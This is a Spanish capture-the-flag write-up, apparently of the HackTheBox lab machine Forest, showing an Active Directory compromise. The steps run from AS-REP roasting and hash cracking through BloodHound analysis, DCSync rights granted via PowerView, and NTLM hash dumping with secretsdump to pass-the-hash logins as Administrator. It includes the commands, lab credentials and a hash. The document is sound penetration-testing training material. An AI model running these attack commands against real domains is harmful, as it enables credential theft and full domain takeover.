![forest info](https://github.com/user-attachments/assets/d884f000-e2bb-4f2d-a4df-8ef484c16cd9)


Comenzamos realizando un escaneo de puertos abiertos con nmap.

``sudo nmap 10.10.10.161 -sS -p- --open --min-rate 5000 -n -Pn -oG allPorts``

![Pasted image 20250313124032](https://github.com/user-attachments/assets/cce45e1d-40db-41e1-8c41-31f49d98e1b7)

Sólo con visualizar los puertos abiertos podemos intuir que nos estamos enfrentándonos a un DC. Una vez conocemos estos puertos abiertos, vamos a observar más a fondo qué servicios están corriendo y bajo qué versiones.

``nmap 10.10.10.161 -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703 -oN target``

![Pasted image 20250313124107](https://github.com/user-attachments/assets/24248001-b40c-41af-8833-7fe81a49fb73)

Con este otro output de nmap tenemos todavía más claro que estamos ante un DC. A su vez, empezamos a tener información de utilidad para resolver el laboratorio. El dominio es htb.local.

Vamos a utilizar la herramienta netexec para enumerar un poco más sobre el DC.

``netexec smb 10.10.10.161``

![Pasted image 20250313124206](https://github.com/user-attachments/assets/a171a0fe-eadb-4794-b73e-f08fe7ad8bed)

Confirmamos que el dominio es htb.local y que la máquina se llama FOREST, por lo que lo añadimos al ``/etc/hosts``.

![Pasted image 20250313124246](https://github.com/user-attachments/assets/808e346e-b59b-469b-bc41-74a39863a464)

Podemos intentar diferentes técnicas para enumerar los usuarios del dominio. Para este escenario concreto, funciona conectarnos por RPC con null sesion:

``rpcclient -U '' 10.10.10.161 -N``

-> enumdomusers

![Pasted image 20250313124508](https://github.com/user-attachments/assets/f2d07d2e-cab3-43c2-827e-d09b253a340b)

Tenemos un listado válido de usuarios. No obstante, necesitamos hacer un tratamiento de los datos para generar un diccionario de usuarios. Aquí tenemos la opción de copiar todo el contenido del output, pero por costumbre y comodidad se realiza de forma diferente: se redirige el output a users.txt desde la terminal.

``rpcclient -U '' 10.10.10.161 -N -c 'enumdomusers' > users.txt``

Si miramos el contenido de users.txt, es exactamente lo mismo que el output que vimos anteriormente:

![Pasted image 20250313124641](https://github.com/user-attachments/assets/a4943d5f-f491-47e0-a0e4-004033203c96)


Vamos a hacer un tratamiento a los datos para quedarnos sólo con lo que nos interesa, es decir, la información que está entre los corchetes:

``cat users.txt | cut -d '[' -f2 | cut -d ']' -f1 > realusers.txt``

![Pasted image 20250313124825](https://github.com/user-attachments/assets/1d620372-a277-4da3-885a-d611c20c18ef)


Una vez tenemos un listado de usuarios válido podemos hacer uso de la técnica AsRepRoasting, incluso aunque no tengamos sus respectivas contraseñas.

``impacket-GetNPUsers -no-pass -usersfile realusers.txt htb.local/ -output hashes.asreproast ``

![Pasted image 20250313125028](https://github.com/user-attachments/assets/d2280ce8-d54e-48c7-8da0-d86470d4c5bc)

-> Bingo. Tenemos el hash de svc-alfresco.

Como hemos redirigido el output a hashes.asreproast, no hace falta que nos copiemos el contenido del hash.

Vamos a utilizar hashcat para romper este hash. Si te pasa como a mí que no memorizas los códigos de identificación de hashcat (para este caso ``krb5asrep$23$``), puede averiguarse fácilmente:

``hashcat --help | grep -i "kerberos"``

![Pasted image 20250313125209](https://github.com/user-attachments/assets/860c0728-affe-4957-ba93-2a035d275079)


Una vez sabemos el código de identificación interno de hashcat (18200), lo lanzamos con rockyou como diccionario.

``hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force ``

![Pasted image 20250313125311](https://github.com/user-attachments/assets/2edaa5b0-c00a-480b-9fee-54b11f98b717)

Nos ha proporcionado una contraseña para el usuario svc_alfresco : s3rvice

No deberíamos tener problema con estas credenciales, pero por metodología vamos a validarlas:

``netexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'``

![Pasted image 20250313125410](https://github.com/user-attachments/assets/128cd2ac-ff87-4b95-9049-cf613249ad34)

Confirmamos que son credenciales válidas. Vamos a comprobar si permite winrm porque el usuario svc_alfresco forme parte del grupo Remote Management Users.

``netexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'``

![Pasted image 20250313125504](https://github.com/user-attachments/assets/2d8ae864-fc25-4152-8595-1cc9c52a1144)

Pwn3d!, por lo que podemos conectarnos vía evil-winrm.

``evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'``

![Pasted image 20250313125644](https://github.com/user-attachments/assets/47f4700b-7614-4d4b-bbc9-df7850c80efb)


Estamos dentro de la máquina víctima con el usuario svc-alfresco.

En C:\Users\svc-alfresco\Desktop encontramos la flag de usuario:

![Pasted image 20250313125828](https://github.com/user-attachments/assets/a26fde34-e3c4-485a-9b36-1956ec5ff78d)




# PRIVESC

Vamos a utilizar la herramienta BloodHound para ayudarnos en la escalada de privilegios. Para ello:

- Arrancamos neo4j

``sudo neo4j start``

- Arrancamos bloodhound

``bloodhound --no-sandbox &>/dev/null & disown``

Introducimos nuestras credenciales de bloodhound.

Como en este escenario en concreto la víctima tiene el servicio DNS corriendo, podemos enumerar vía bloodhound-python sin necesidad de compartir sharphound:

``bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -c all -ns 10.10.10.161``

![Pasted image 20250313132042](https://github.com/user-attachments/assets/a501cfe5-18a0-4dec-9bfb-bcb513ea0dfc)


Una vez hemos generado todos los archivos .json, los subimos a bloodhound desde su interfaz gráfica:

![Pasted image 20250313132148](https://github.com/user-attachments/assets/2d05891f-5425-46dd-a4c2-38b7c979b0d7)


![Pasted image 20250313132228](https://github.com/user-attachments/assets/056be20a-6cc5-487a-9660-472a12621384)


Una vez se ha subido correctamente toda la data, buscamos al usuario que tenemos pwneado: svc-alfresco

![Pasted image 20250313132326](https://github.com/user-attachments/assets/be0bc300-fd50-490b-a1bf-87cbc8e7d389)


Y lo marcamos como owned:

![Pasted image 20250313132345](https://github.com/user-attachments/assets/236a4cbf-27f6-45f4-891c-55b622b912b7)

Si miramos la información del nodo de svc-alfresco, y más en concreto el apartado "Reachable High Value Targets", vemos cosas interesantes:

![Pasted image 20250313145534](https://github.com/user-attachments/assets/507067a7-9fe9-4f23-b09d-593973a8d8a5)


El usuario svc-alfresco forma parte del grupo "Service Accounts", que a su vez forma parte de "Privileged It Accounts", que a su vez forma parte de "Account Operators".

Si miramos la información del nodo de "Account Operators", y nuevamente el apartado "Reachable High Value Targets", vemos:

![Pasted image 20250313145759](https://github.com/user-attachments/assets/8eac1c8b-5880-47fb-9c6e-29920d985cf0)

El grupo "Account Operators" tiene el privilegio GenericAll sobre el grupo "Exchange Windows Permissions, que a su vez tiene el privilegio "WriteDacl" sobre el dominio htb.local. Si necesitamos más información sobre la relación que existe entre los grupos o sobre el privilegio, podemos hacer click derecho -> help

![Pasted image 20250313145841](https://github.com/user-attachments/assets/754baee3-e13f-44b3-94ce-1839898e69a6)

Por ejemplo, para este caso, nos confirma lo que vimos en el diagrama: los miembros del grupo "Account Operators"  tienen el privilegio GenericAll sobre el grupo "Exchange Windows Permissions".

![Pasted image 20250313145901](https://github.com/user-attachments/assets/377eeedf-f904-4fc7-9510-40c5441ef6f1)


A su vez, si queremos ver la relación que hay entre el grupo "Exchange Windows Permissions" y el dominio a través del privilegio WriteDacl, hacemos nuevamente click derecho -> help. A su vez, esto nos permite conocer la forma de explotar este privilegio:

![Pasted image 20250313153133](https://github.com/user-attachments/assets/9dd7375f-0129-49da-94cb-4e7eb4c7cf98)


En el apartado "Windows Abuse" nos explica el paso a paso para hacerlo desde dentro.

Si observamos la información que nos facilita BloodHound para la explotación de este privilegio, vemos que necesitamos compartir powerview.ps1 para hacer uso de Add-DomainObjectAcl. Para ello:

- En máquina atacante abrimos smbserver (en el directorio donde tengamos powerview.ps1):
  
``impacket-smbserver -smb2support test .``

- Solicitamos el recurso desde máquina víctima:
  
``copy //10.10.14.4/test/powerview.ps1 powerview.ps1``

Una vez ya lo tenemos en la máquina víctima, comenzamos.

- Creamos usuario pwn:

![Pasted image 20250313155139](https://github.com/user-attachments/assets/ac343399-b976-450b-b7b6-e9dcf5a596c8)


- Le añadimos al grupo "Exchange Windows Permissions"

![Pasted image 20250313155200](https://github.com/user-attachments/assets/7d6bbb74-0109-4c93-9bda-3dad81c731ee)

Y seguimos los comandos propuestos por Bloodhound, pero adaptados a nuestro escenario (dominio y usuario):

```
$SecPassword = ConvertTo-SecureString 'pwned123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\pwn', $SecPassword)
```

Importamos powerview.ps1 para poder hacer uso de Add-DomainObjectAcl:

``. .\powerview.ps1``

Otorgamos privilegios DCSync al usuario pwn:

``Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity pwn -Rights DCSync``

Inciso importante.

Aquí bloodhound propone ejecutar el anterior comando identificando al dominio de la siguiente forma: ``-TargetIdentity htb.local``. Sin embargo, cuando se realiza la técnica DCSync desde el usuario pwn, nos salta error mencionando el Distinguised Name.
Error:

![Pasted image 20250313163246](https://github.com/user-attachments/assets/dfff53eb-9410-4895-9bee-2b3e77d1259e)

Y aunque se utilice -use-vss como nos propone, nos da acceso denegado:

![Pasted image 20250313163310](https://github.com/user-attachments/assets/deb76d59-7261-43ff-8c98-daaff6742a9e)

Esto se soluciona identificando al dominio como se ha descrito en el primer comando:

``-TargetIdentity "DC=htb,DC=local"``
![Pasted image 20250313160755](https://github.com/user-attachments/assets/6e6a20f8-c074-4547-9231-30cfc2967d3d)



Una vez el usuario pwn tiene el privilegio DCSync, lo explotamos vía impacket para volcar todos los hashes NTLM:

``impacket-secretsdump htb.local/'pwn':'pwned123!'@'10.10.10.161'``

![Pasted image 20250313161100](https://github.com/user-attachments/assets/3b495c41-27ef-4da6-969b-247e2b320e59)


Nos vuelca todos los hashes NTLM, pero para continuar nos interesa especialmente el hash del usuario Administrator.

Nos lo copiamos.

Validamos el hashNTLM con netexec:

``netexec smb 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'``

![Pasted image 20250313161236](https://github.com/user-attachments/assets/8c11b46c-783e-43c3-9115-002f084c3a39)

Pwn3d!, son credenciales válidas y, efectivamente, de Administrador.

Dado que conocemos el hash NTLM válido de Administrator podemos acceder al sistema víctima con la técnica Pass The Hash. Como nos pone Pwn3d! podemos ingresar vía psexec (para acceder como NTAuthority\System) o wmiexec (para acceder como Adminsitrator), o winRM (si el administrador forma parte del grupo Remote Management Users):

- psexec:

``impacket-psexec Administrator@10.10.10.161 -hashes ':32693b11e6aa90eb43d32c72a07ceea6'``

![Pasted image 20250313161653](https://github.com/user-attachments/assets/80c51f5a-09e1-490e-9ae8-648b8df85f29)


- wmiexec:

``impacket-wmiexec Administrator@10.10.10.161 -hashes ':32693b11e6aa90eb43d32c72a07ceea6'``

![Pasted image 20250313161707](https://github.com/user-attachments/assets/dd55e932-5137-458e-ab18-741be72165ec)


- evilwinrm:

Primero deberíamos validar que nos podemos conectar por winrm:

``netexec winrm 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'``

![Pasted image 20250313161332](https://github.com/user-attachments/assets/28ecf169-59bd-4be2-b576-882f3bf2057d)

Pwn3d!, por lo que podemos utilizar evil-winrm.

``evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'``

![Pasted image 20250313161907](https://github.com/user-attachments/assets/c68e5a25-7f45-461b-8d64-581634adcac7)


Podemos conectarnos a la máquina víctima y elevar privilegios de cualquiera de estas tres formas descritas.

Recogemos la flag de Administrator en C:\Users\Administrator\Desktop\root.txt

![Pasted image 20250313162055](https://github.com/user-attachments/assets/2280f8a3-2bcd-4c19-9dbd-2f5cbab2afa4)


